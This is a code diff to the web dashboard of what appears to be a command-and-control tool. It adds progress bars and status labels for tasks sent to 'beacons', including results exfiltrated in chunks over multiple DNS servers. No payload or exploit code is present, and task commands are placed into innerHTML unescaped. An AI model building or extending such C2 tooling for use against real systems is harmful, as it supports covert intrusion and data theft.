@@ -458,6 +458,59 @@
             color: #888;
             margin-top: 3px;
         }
+
+        /* Inline progress bars for task list */
+        .task-progress-inline {
+            margin-top: 8px;
+            margin-bottom: 5px;
+        }
+
+        .progress-bar-container-small {
+            width: 100%;
+            height: 4px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 2px;
+            overflow: hidden;
+            margin-bottom: 3px;
+        }
+
+        .progress-bar-small {
+            height: 100%;
+            background: linear-gradient(90deg, #ff3333, #ff6666);
+            transition: width 0.3s ease;
+            border-radius: 2px;
+        }
+
+        .progress-text-small {
+            font-size: 10px;
+            color: #888;
+        }
+
+        /* Enhanced status colors */
+        .task-status.pending {
+            background: rgba(150, 150, 150, 0.2);
+            color: #999;
+        }
+
+        .task-status.exfiltrating {
+            background: rgba(255, 165, 0, 0.2);
+            color: #ffa500;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        .task-status.assembling {
+            background: rgba(100, 149, 237, 0.2);
+            color: #6495ed;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.6;
+            }
+        }
     </style>
 </head>
 <body>
@@ -665,17 +718,52 @@
                     return;
                 }
 
-                const tasksHtml = beaconTasks.map(task => `
-                    <div class="task-item ${selectedTaskId === task.id ? 'selected' : ''}" onclick="selectTask('${task.id}')">
-                        <div class="task-header">
-                            <span class="task-id">${task.id}</span>
-                            <span class="task-status ${task.status}">${task.status.toUpperCase()}</span>
+                const tasksHtml = beaconTasks.map(task => {
+                    // Determine display status and styling
+                    let displayStatus = task.status.toUpperCase();
+                    let statusClass = task.status;
+                    let progressHtml = '';
+
+                    // Enhanced status display for better clarity
+                    if (task.status === 'pending') {
+                        displayStatus = 'QUEUED';
+                    } else if (task.status === 'sent' && task.progress) {
+                        // Task is being executed and data is being exfiltrated
+                        const prog = task.progress;
+                        if (prog.received_chunks === 0) {
+                            displayStatus = 'EXECUTING';
+                        } else if (prog.received_chunks < prog.total_chunks) {
+                            displayStatus = 'EXFILTRATING';
+                            statusClass = 'exfiltrating';
+                            // Show inline progress bar
+                            progressHtml = `
+                                <div class="task-progress-inline">
+                                    <div class="progress-bar-container-small">
+                                        <div class="progress-bar-small" style="width: ${prog.progress}%"></div>
+                                    </div>
+                                    <div class="progress-text-small">${prog.received_chunks}/${prog.total_chunks} chunks (${prog.progress}%)</div>
+                                </div>`;
+                        } else {
+                            displayStatus = 'ASSEMBLING';
+                            statusClass = 'assembling';
+                        }
+                    } else if (task.status === 'sent') {
+                        displayStatus = 'EXECUTING';
+                    }
+
+                    return `
+                        <div class="task-item ${selectedTaskId === task.id ? 'selected' : ''}" onclick="selectTask('${task.id}')">
+                            <div class="task-header">
+                                <span class="task-id">${task.id}</span>
+                                <span class="task-status ${statusClass}">${displayStatus}</span>
+                            </div>
+                            <div class="task-command">$ ${task.command}</div>
+                            ${progressHtml}
+                            <div class="task-time">Created: ${formatTimestamp(task.created_at)}</div>
+                            ${task.completed_at ? `<div class="task-time">Completed: ${formatTimestamp(task.completed_at)}</div>` : ''}
                         </div>
-                        <div class="task-command">$ ${task.command}</div>
-                        <div class="task-time">Created: ${formatTimestamp(task.created_at)}</div>
-                        ${task.completed_at ? `<div class="task-time">Completed: ${formatTimestamp(task.completed_at)}</div>` : ''}
-                    </div>
-                `).join('');
+                    `;
+                }).join('');
 
                 document.getElementById('tasksList').innerHTML = tasksHtml;
             } catch (error) {
@@ -706,19 +794,38 @@
                 } else if (task.status === 'sent' && task.progress) {
                     // Show progress bar for tasks in progress
                     const progress = task.progress;
+                    let statusMessage = '';
+                    let statusIcon = '';
+
+                    if (progress.received_chunks === 0) {
+                        statusIcon = '⚡';
+                        statusMessage = 'Command sent to beacon, waiting for execution...';
+                    } else if (progress.received_chunks < progress.total_chunks) {
+                        statusIcon = '📥';
+                        statusMessage = `Exfiltrating results via Shadow Mesh (distributed across ${task.dns_servers || 'multiple'} DNS servers)`;
+                    } else {
+                        statusIcon = '🔄';
+                        statusMessage = 'All chunks received, assembling final result...';
+                    }
+
                     resultContent.innerHTML = `
                         <div class="no-result">
-                            ⏳ Task is being executed...<br><br>
+                            <div style="font-size: 32px; margin-bottom: 10px;">${statusIcon}</div>
+                            <div style="font-size: 14px; margin-bottom: 20px;">${statusMessage}</div>
                             <div class="progress-bar-container">
                                 <div class="progress-bar" style="width: ${progress.progress}%"></div>
                             </div>
-                            <div class="progress-text">
-                                Progress: ${progress.received_chunks} / ${progress.total_chunks} chunks (${progress.progress}%)
+                            <div class="progress-text" style="margin-top: 10px; font-size: 13px;">
+                                <strong>${progress.received_chunks} / ${progress.total_chunks} chunks</strong> (${progress.progress}%)
                             </div>
+                            ${progress.status ? `<div style="color: #888; font-size: 11px; margin-top: 5px;">Status: ${progress.status}</div>` : ''}
                         </div>`;
                     resultSection.style.display = 'block';
-                } else if (task.status === 'pending' || task.status === 'sent') {
-                    resultContent.innerHTML = '<div class="no-result">⏳ Task is pending execution...</div>';
+                } else if (task.status === 'pending') {
+                    resultContent.innerHTML = '<div class="no-result">⏳ Task queued, waiting for beacon check-in...</div>';
+                    resultSection.style.display = 'block';
+                } else if (task.status === 'sent') {
+                    resultContent.innerHTML = '<div class="no-result">⚡ Task sent, beacon is executing command...</div>';
                     resultSection.style.display = 'block';
                 } else {
                     resultContent.innerHTML = '<div class="no-result">❌ No result available</div>';
